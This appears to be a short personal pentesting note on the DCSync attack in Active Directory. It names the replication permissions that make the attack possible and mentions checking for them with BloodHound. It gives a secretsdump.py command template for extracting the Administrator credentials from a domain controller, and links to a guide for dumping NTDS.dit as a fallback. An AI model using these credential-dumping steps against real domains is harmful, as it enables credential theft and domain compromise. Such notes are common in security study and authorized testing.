If a user has these permissions, they can execute a DCSync attack
- can check user permissions via bloodhound
![[../../assets/DCSync — DS-Replication-Get-Changes and DS-Replication-Get-Changes-All/image 403.png|image 403.png]]
![[../../assets/DCSync — DS-Replication-Get-Changes and DS-Replication-Get-Changes-All/image 1 300.png|image 1 300.png]]
- [secretsdump.py](http://secretsdump.py) <DOMAIN/user>@<IP> -just-dc-user Administrator
    
    - copies just administartor creds from the DC
    
  
  
if secretsdump doesn’t work, try dumping the NTDS.dit
[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)